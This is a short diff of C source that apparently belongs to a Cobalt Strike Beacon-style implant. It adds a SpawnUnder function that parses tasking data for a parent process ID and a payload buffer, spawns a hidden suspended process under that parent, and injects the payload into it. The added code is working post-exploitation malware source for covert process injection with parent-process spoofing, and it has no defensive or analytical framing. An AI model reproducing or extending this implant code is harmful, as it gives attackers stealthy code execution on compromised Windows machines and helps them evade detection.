@@ -1401,3 +1401,27 @@ BOOL SpawnUnderInternal(BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INF
 	return RunUnder(cmd, strlen(cmd), si, pi, CREATE_SUSPENDED, ignoreToken, pid);
 }
 
+void SpawnUnder(char* buffer, int length, BOOL x86)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int pid = BeaconDataInt(&parser);
+	char* payload = BeaconDataBuffer(&parser);
+	int payloadLength = BeaconDataLength(&parser);
+
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	GetStartupInfoA(&si);
+	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+	si.wShowWindow = SW_HIDE;
+	si.hStdInput = 0;
+	si.hStdOutput = 0;
+	si.hStdError = 0;
+
+	if (SpawnUnderInternal(x86, TRUE, &si, &pi, pid))
+	{
+		Sleep(100);
+		BeaconInjectTemporaryProcess(&pi, payload, payloadLength, 0, NULL, 0);
+		BeaconCleanupProcess(&pi);
+	}
+}
